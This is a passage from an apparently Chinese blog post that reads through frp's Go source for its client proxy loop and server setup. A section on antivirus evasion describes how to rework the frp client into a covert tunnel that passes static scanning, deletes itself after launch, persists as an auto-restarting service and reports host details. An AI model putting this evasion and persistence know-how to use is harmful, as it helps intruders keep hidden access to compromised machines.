<code>pxy.Start()</code>​ 了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pw *Wrapper)</span></span> Start() &#123;<br><span class="hljs-keyword">go</span> pw.checkWorker()<br><span class="hljs-keyword">if</span> pw.monitor != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> pw.monitor.Start()<br>&#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pw *Wrapper)</span></span> checkWorker() &#123;<br>xl := pw.xl<br><span class="hljs-keyword">if</span> pw.monitor != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// let monitor do check request first</span><br><span class="hljs-comment">// 等一会先做监控监控 ?</span><br>time.Sleep(<span class="hljs-number">500</span> * time.Millisecond)<br>&#125;<br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-comment">// check proxy status</span><br>now := time.Now()<br><span class="hljs-comment">// 健康是否为 0 如果不开健康监控 默认就是 0</span><br><span class="hljs-comment">// 所以默认就是只走这里</span><br><span class="hljs-keyword">if</span> atomic.LoadUint32(&amp;pw.health) == <span class="hljs-number">0</span> &#123;<br>pw.mu.Lock()<br><span class="hljs-comment">// 1. 新建代理</span><br><span class="hljs-comment">// 2. 检查失败</span><br><span class="hljs-comment">// 3. 等待开始 + 从上传发送开始消息算目前已经超时了</span><br><span class="hljs-comment">// 4. 开始失败 + 超时</span><br><span class="hljs-keyword">if</span> pw.Phase == ProxyPhaseNew ||<br>pw.Phase == ProxyPhaseCheckFailed ||<br>(pw.Phase == ProxyPhaseWaitStart &amp;&amp; now.After(pw.lastSendStartMsg.Add(waitResponseTimeout))) ||<br>(pw.Phase == ProxyPhaseStartErr &amp;&amp; now.After(pw.lastStartErr.Add(startErrTimeout))) &#123;<br><br>xl.Tracef(<span class="hljs-string">&quot;change status from [%s] to [%s]&quot;</span>, pw.Phase, ProxyPhaseWaitStart)<br><span class="hljs-comment">// 设置状态</span><br>pw.Phase = ProxyPhaseWaitStart<br><span class="hljs-comment">// 新建代理请求</span><br><span class="hljs-keyword">var</span> newProxyMsg msg.NewProxy<br><span class="hljs-comment">// 把代理配置转换为新建代理请求消息</span><br>pw.Cfg.MarshalToMsg(&amp;newProxyMsg)<br><span class="hljs-comment">// 上次开始时间</span><br>pw.lastSendStartMsg = now<br><span class="hljs-comment">// 使用 handle 取处理这个开始代理的 payload 事件</span><br>_ = pw.handler(&amp;event.StartProxyPayload&#123;<br>NewProxyMsg: &amp;newProxyMsg,<br>&#125;)<br>&#125;<br>pw.mu.Unlock()<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>pw.mu.Lock()<br><span class="hljs-keyword">if</span> pw.Phase == ProxyPhaseRunning || pw.Phase == ProxyPhaseWaitStart &#123;<br>pw.<span class="hljs-built_in">close</span>()<br>xl.Tracef(<span class="hljs-string">&quot;change status from [%s] to [%s]&quot;</span>, pw.Phase, ProxyPhaseCheckFailed)<br>pw.Phase = ProxyPhaseCheckFailed<br>&#125;<br>pw.mu.Unlock()<br>&#125;<br><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-pw.closeCh:<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">case</span> &lt;-time.After(statusCheckInterval):<br><span class="hljs-keyword">case</span> &lt;-pw.healthNotifyCh:<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pm *Manager)</span></span> HandleEvent(payload <span class="hljs-keyword">interface</span>&#123;&#125;) <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">var</span> m msg.Message<br><span class="hljs-keyword">switch</span> e := payload.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *event.StartProxyPayload:<br>m = e.NewProxyMsg<br><span class="hljs-keyword">case</span> *event.CloseProxyPayload:<br>m = e.CloseProxyMsg<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> event.ErrPayloadType<br>&#125;<br><span class="hljs-comment">// 发送新建代理消息</span><br><span class="hljs-keyword">return</span> pm.msgTransporter.Send(m)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="keepControllerWorking"><a href="#keepControllerWorking" class="headerlink" title="keepControllerWorking()"></a>keepControllerWorking()</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(svr *Service)</span></span> keepControllerWorking() &#123;<br><span class="hljs-comment">// 等待上面的那个 loopLoginUntilSuccess 失败退出 然后就继续执行 loopLoginUntilSuccess</span><br>&lt;-svr.ctl.Done()<br><br><span class="hljs-comment">// There is a situation where the login is successful but due to certain reasons,</span><br><span class="hljs-comment">// the control immediately exits. It is necessary to limit the frequency of reconnection in this case.</span><br><span class="hljs-comment">// The interval for the first three retries in 1 minute will be very short, and then it will increase exponentially.</span><br><span class="hljs-comment">// The maximum interval is 20 seconds.</span><br><span class="hljs-comment">// 登录成功，但由于某些原因，</span><br><span class="hljs-comment">// 控件立即退出。在这种情况下，有必要限制重新连接的频率。</span><br><span class="hljs-comment">// 1分钟内前三次重试的时间间隔将非常短，然后将呈指数级增长。</span><br><span class="hljs-comment">// 最大时间间隔为20秒。</span><br>wait.BackoffUntil(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> (<span class="hljs-type">bool</span>, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// loopLoginUntilSuccess is another layer of loop that will continuously attempt to</span><br><span class="hljs-comment">// login to the server until successful.</span><br>svr.loopLoginUntilSuccess(<span class="hljs-number">20</span>*time.Second, <span class="hljs-literal">false</span>)<br><span class="hljs-keyword">if</span> svr.ctl != <span class="hljs-literal">nil</span> &#123;<br>&lt;-svr.ctl.Done()<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, errors.New(<span class="hljs-string">&quot;control is closed and try another loop&quot;</span>)<br>&#125;<br><span class="hljs-comment">// If the control is nil, it means that the login failed and the service is also closed.</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, <span class="hljs-literal">nil</span><br>&#125;, wait.NewFastBackoffManager(<br>wait.FastBackoffOptions&#123;<br>Duration:        time.Second,<br>Factor:          <span class="hljs-number">2</span>,<br>Jitter:          <span class="hljs-number">0.1</span>,<br>MaxDuration:     <span class="hljs-number">20</span> * time.Second,<br>FastRetryCount:  <span class="hljs-number">3</span>,<br>FastRetryDelay:  <span class="hljs-number">200</span> * time.Millisecond,<br>FastRetryWindow: time.Minute,<br>FastRetryJitter: <span class="hljs-number">0.5</span>,<br>&#125;,<br>), <span class="hljs-literal">true</span>, svr.ctx.Done())<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="流程整理"><a href="#流程整理" class="headerlink" title="流程整理"></a>流程整理</h3><p>这里简单写一下客户端是如何处理代理的简单流程：</p><ol><li><p><code>svr.login()</code>​ 客户端发送登录消息成功登录</p></li><li><p><code>ctl.worker()</code>​ 启动消息调度器（ 两个协程 ）</p><ol><li><p><code>sendLoop()</code>​ 向服务端发送消息</p></li><li><p><code>readLoop()</code>​ 读取消息并使用各种 handle 进行处理</p><ul><li><p><code>msg.NewProxyResp</code>​ 新建代理响应，客户端设置该代理的状态为 <code>ProxyPhaseRunning</code>​</p></li><li><p><code>msg.ReqWorkConn</code>​ 请求工作连接</p><ol><li><p>获取一个和服务端的工作连接</p></li><li><p>发送新建工作的消息（ 携带 runid ）</p></li><li><p>接收服务端的表示开始工作的消息（ 其中有包含要进行工作的代理信息 ）</p></li><li><p>然后把这个连接丢给这个代理服务，代理服务会先判断这个代理的连接是否为 <code>ProxyPhaseRunning</code>​</p></li><li><p>如果一切正常，就启动这个代理</p><ol><li>是否加密、压缩</li><li>插件处理</li><li>正常的 TCP 端口转发</li></ol></li></ol></li></ul></li></ol></li><li><p><code>UpdateAll(proxyCfgs []v1.ProxyConfigurer)</code>​ 启动所有代理</p><ol><li><p>一些前置操作，判断是否正常，加入到代理管理器，创建 Wrapper 设置代理状态为 <code>ProxyPhaseNew</code>​</p></li><li><p>死循环</p><ol><li>判断当前代理状态</li><li>如果是 <code>ProxyPhaseNew</code>​ 或者啥啥啥的就设置代理状态为 <code>ProxyPhaseWaitStart</code>​ 并发送新建代理请求</li></ol></li></ol></li></ol><p>‍</p><p>就是这样，<code>UpdateAll</code>​ 发送了新建代理请求后，消息调度器收到新建代理的响应，然后把这个代理的状态设置为 <code>ProxyPhaseRunning</code>​，表示当前代理正常运行。</p><p>当前服务端发送工作请求的时候，客户端检查当前代理的状态是否为 <code>ProxyPhaseRunning</code>​，如果正常运行就启动这个代理的相关工作（ socks 、端口转发）等等。</p><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><h4 id="流量"><a href="#流量" class="headerlink" title="流量"></a>流量</h4><p>当前版本的 frp 有着一些帮助免杀默认的配置：</p><ol><li>默认开启 TLS 传输</li><li>默认开启流量加密、压缩</li><li>默认关闭了 TLS 首字节特征</li></ol><p>所以感觉目前这个版本就不需要进行什么自定义配置。</p><h4 id="静态"><a href="#静态" class="headerlink" title="静态"></a>静态</h4><p>因为只是个正常的工具，所以简单改一下结构再编译其实就能过免杀了。</p><ol><li>把 client 包下面的 go 文件都过一遍，只留下 tcp 相关的，因为其他基本不用，然后再加功能做修改</li><li>go.mod 中右键项目名称，重构为其他字符串</li><li>不使用 Go Cobra 库的命令行，而是直接 main 函数里面写好，就不需要再搞配置文件了，麻烦</li></ol><p>目前这些就够了，如果不行重写一下调用结构就可以了。</p><p>需要注意的是 client 和 server 包里面 init 方法中的默认密钥要同步，全部删除或者修改。</p><p>阅读的目的是为了去加一些功能，方便使用：</p><ol><li>socks 随机用户名密码、端口 0 （ 服务端自动寻找空闲端口 ）</li><li>在代理的描述信息那里写上 hostname、网络信息、上线时间、socks 的用户名密码</li><li>代理名称 &#x3D; 主机名 + socks5 + MD5 的主机名 + 网络信息的字符串取一部分出来，这样就可以防止多次运行客户端导致的上线多个代理，又能够明了的知道是哪个主机的</li><li>运行模式：<ol><li>正常模式：启动后子进程运行 + 成功运行后删除自身，就不用 nohup 运行和再手动删除了</li><li>服务模式：Linux 系统服务，进程没了 2 min 后重新启动，开机自启动</li></ol></li><li>frps 端控制 frpc 的退出，服务模式删除</li><li>frpc 登录失败 &gt; 500 次后则自动退出</li></ol><p>‍</p><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p>go build 直接编译：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20241208200527-r5a2c8i.png?imageSlim" alt="image-20241208200527-r5a2c8i.png"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20241208192729-hi8l2n1.png?imageSlim" alt="image-20241208192729-hi8l2n1.png"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20241208195550-kuj0saa.png?imageSlim" alt="image-20241208195550-kuj0saa.png"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20241208195611-g1m8smm.png?imageSlim" alt="image-20241208195611-g1m8smm.png"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20241208201401-x1v1cx4.png?imageSlim" alt="image-20241208201401-x1v1cx4.png"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20241208195815-4phnjly.png?imageSlim" alt="image-20241208195815-4phnjly.png"></p><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">runServer</span><span class="hljs-params">(cfg *v1.ServerConfig)</span></span> (err <span class="hljs-type">error</span>) &#123;<br>log.InitLogger(cfg.Log.To, cfg.Log.Level, <span class="hljs-type">int</span>(cfg.Log.MaxDays), cfg.Log.DisablePrintColor)<br><br><span class="hljs-keyword">if</span> cfgFile != <span class="hljs-string">&quot;&quot;</span> &#123;<br>log.Infof(<span class="hljs-string">&quot;frps uses config file: %s&quot;</span>, cfgFile)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>log.Infof(<span class="hljs-string">&quot;frps uses command line arguments for config&quot;</span>)<br>&#125;<br><span class="hljs-comment">// 服务</span><br>svr, err := server.NewService(cfg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>log.Infof(<span class="hljs-string">&quot;frps started successfully&quot;</span>)<br><span class="hljs-comment">// 运行</span><br>svr.Run(context.Background())<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="初始化操作-NewService"><a href="#初始化操作-NewService" class="headerlink" title="初始化操作 NewService"></a>初始化操作 NewService</h3><p>Service 结构体：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Server service</span><br><span class="hljs-keyword">type</span> Service <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// Dispatch connections to different handlers listen on same port</span><br><span class="hljs-comment">// 分派连接到不同的处理程序监听相同的端口</span><br>muxer *mux.Mux<br><br><span class="hljs-comment">// Accept connections from client</span><br><span class="hljs-comment">// 接收来自客户端的连接</span><br>listener net.Listener<br><br><span class="hljs-comment">// Accept connections using kcp</span><br>kcpListener net.Listener<br><br><span class="hljs-comment">// Accept connections using quic</span><br>quicListener *quic.Listener<br><br><span class="hljs-comment">// Accept connections using websocket</span><br>websocketListener net.Listener<br><br><span class="hljs-comment">// Accept frp tls connections</span><br>tlsListener net.Listener<br><br><span class="hljs-comment">// Accept pipe connections from ssh tunnel gateway</span><br>sshTunnelListener *netpkg.InternalListener<br><br><span class="hljs-comment">// Manage all controllers</span><br>ctlManager *ControlManager<br><br><span class="hljs-comment">// Manage all proxies</span><br>pxyManager *proxy.Manager<br><br><span class="hljs-comment">// Manage all plugins</span><br>pluginManager *plugin.Manager<br><br><span class="hljs-comment">// HTTP vhost router</span><br>httpVhostRouter *vhost.Routers<br><br><span class="hljs-comment">// All resource managers and controllers</span><br>rc *controller.ResourceController<br><br><span class="hljs-comment">// web server for dashboard UI and apis</span><br>webServer *httppkg.Server<br><br>sshTunnelGateway *ssh.Gateway<br><br><span class="hljs-comment">// Verifies authentication based on selected method</span><br>authVerifier auth.Verifier<br><br>tlsConfig *tls.Config<br><br>cfg *v1.ServerConfig<br><br><span class="hljs-comment">// service context</span><br>ctx context.Context<br><span class="hljs-comment">// call cancel to stop service</span><br>cancel context.CancelFunc<br>&#125;<br></code></pre></td></tr></table></figure><p>新建服务，做一些初始化操作，然后监听服务端端口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewService</span><span class="hljs-params">(cfg *v1.ServerConfig)</span></span> (*Service, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// TLS 配置</span><br>tlsConfig, err := transport.NewServerTLSConfig(<br>cfg.Transport.TLS.CertFile,<br>cfg.Transport.TLS.KeyFile,<br>cfg.Transport.TLS.TrustedCaFile)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// ....</span><br>svr := &amp;Service&#123;<br>ctlManager:    NewControlManager(),<span class="hljs-comment">// 控制器管理器</span><br>pxyManager:    proxy.NewManager(),<span class="hljs-comment">// 代理管理器</span><br>pluginManager: plugin.NewManager(),<span class="hljs-comment">// 插件管理器</span><br><span class="hljs-comment">// 资源管理</span><br>rc: &amp;controller.ResourceController&#123;<br>VisitorManager: visitor.NewManager(),<br>TCPPortManager: ports.NewManager(<span class="hljs-string">&quot;tcp&quot;</span>, cfg.ProxyBindAddr, cfg.AllowPorts),<br>UDPPortManager: ports.NewManager(<span class="hljs-string">&quot;udp&quot;</span>, cfg.ProxyBindAddr, cfg.AllowPorts),<br>&#125;,<br>sshTunnelListener: netpkg.NewInternalListener(),<br>httpVhostRouter:   vhost.NewRouters(),<br><span class="hljs-comment">// 认证</span><br>authVerifier:      auth.NewAuthVerifier(cfg.Auth),<br>webServer:         webServer,<br>tlsConfig:         tlsConfig,<br>cfg:               cfg,<br>ctx:               context.Background(),<br>&#125;<br><span class="hljs-comment">// WEB 服务路由注册</span><br><span class="hljs-keyword">if</span> webServer != <span class="hljs-literal">nil</span> &#123;<br>webServer.RouteRegister(svr.registerRouteHandlers)<br>&#125;<br><br><span class="hljs-comment">// Create tcpmux httpconnect multiplexer.</span><br><span class="hljs-comment">// TCP 多路复用</span><br><span class="hljs-keyword">if</span> cfg.TCPMuxHTTPConnectPort &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">var</span> l net.Listener<br><span class="hljs-comment">// 普通的 TPC 监听</span><br>address := net.JoinHostPort(cfg.ProxyBindAddr, strconv.Itoa(cfg.TCPMuxHTTPConnectPort))<br>l, err = net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, address)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;create server listener error, %v&quot;</span>, err)<br>&#125;<br><span class="hljs-comment">// 创建一个 TCP 多路复用相关的</span><br>svr.rc.TCPMuxHTTPConnectMuxer, err = tcpmux.NewHTTPConnectTCPMuxer(l, cfg.TCPMuxPassthrough, vhostReadWriteTimeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;create vhost tcpMuxer error, %v&quot;</span>, err)<br>&#125;<br>log.Infof(<span class="hljs-string">&quot;tcpmux httpconnect multiplexer listen on %s, passthough: %v&quot;</span>, address, cfg.TCPMuxPassthrough)<br>&#125;<br><br><span class="hljs-comment">// Init all plugins</span><br><span class="hljs-comment">// HTTP 插件</span><br><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> cfg.HTTPPlugins &#123;<br>svr.pluginManager.Register(plugin.NewHTTPPluginOptions(p))<br>log.Infof(<span class="hljs-string">&quot;plugin [%s] has been registered&quot;</span>, p.Name)<br>&#125;<br>svr.rc.PluginManager = svr.pluginManager<br><br><span class="hljs-comment">// Init group controller</span><br><span class="hljs-comment">// TCP 管理器组</span><br>svr.rc.TCPGroupCtl = group.NewTCPGroupCtl(svr.rc.TCPPortManager)<br><br><span class="hljs-comment">// Init HTTP group controller</span><br>svr.rc.HTTPGroupCtl = group.NewHTTPGroupController(svr.httpVhostRouter)<br><br><span class="hljs-comment">// Init TCP mux group controller</span><br>svr.rc.TCPMuxGroupCtl = group.NewTCPMuxGroupCtl(svr.rc.TCPMuxHTTPConnectMuxer)<br><br><span class="hljs-comment">// Init 404 not found page</span><br>vhost.NotFoundPagePath = cfg.Custom404Page<br><br><span class="hljs-keyword">var</span> (<br>httpMuxOn  <span class="hljs-type">bool</span><br>httpsMuxOn <span class="hljs-type">bool</span><br>)<br><br><span class="hljs-comment">// 服务端的监听端口 = 代理的端口 http|s 多路复用</span><br><span class="hljs-keyword">if</span> cfg.BindAddr == cfg.ProxyBindAddr &#123;<br><span class="hljs-keyword">if</span> cfg.BindPort == cfg.VhostHTTPPort &#123;<br>httpMuxOn = <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> cfg.BindPort == cfg.VhostHTTPSPort &#123;<br>httpsMuxOn = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">// Listen for accepting connections from client.</span><br><span class="hljs-comment">// 监听客户端的 TCP 连接</span><br>address := net.JoinHostPort(cfg.BindAddr, strconv.Itoa(cfg.BindPort))<br>ln, err := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, address)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;create server listener error, %v&quot;</span>, err)<br>&#125;<br><span class="hljs-comment">// 把这个监听给到 muxer =&gt; 连接调度, 分派客户端连接给到不同的处理程序进行处理</span><br>svr.muxer = mux.NewMux(ln)<br>svr.muxer.SetKeepAlive(time.Duration(cfg.Transport.TCPKeepAlive) * time.Second)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>_ = svr.muxer.Serve()<br>&#125;()<br>ln = svr.muxer.DefaultListener()<br><br>svr.listener = ln<br>log.Infof(<span class="hljs-string">&quot;frps tcp listen on %s&quot;</span>, address)<br><span class="hljs-comment">// ....</span><br><span class="hljs-keyword">return</span> svr, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后是服务的启动 Run 方法，主要是启动监听的处理程序：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(svr *Service)</span></span> Run(ctx context.Context) &#123;<br>ctx, cancel := context.WithCancel(ctx)<br>svr.ctx = ctx<br>svr.cancel = cancel<br><br><span class="hljs-comment">// run dashboard web server.</span><br><span class="hljs-keyword">if</span> svr.webServer != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>log.Infof(<span class="hljs-string">&quot;dashboard listen on %s&quot;</span>, svr.webServer.Address())<br><span class="hljs-keyword">if</span> err := svr.webServer.Run(); err != <span class="hljs-literal">nil</span> &#123;<br>log.Warnf(<span class="hljs-string">&quot;dashboard server exit with error: %v&quot;</span>, err)<br>&#125;<br>&#125;()<br>&#125;<br><br><span 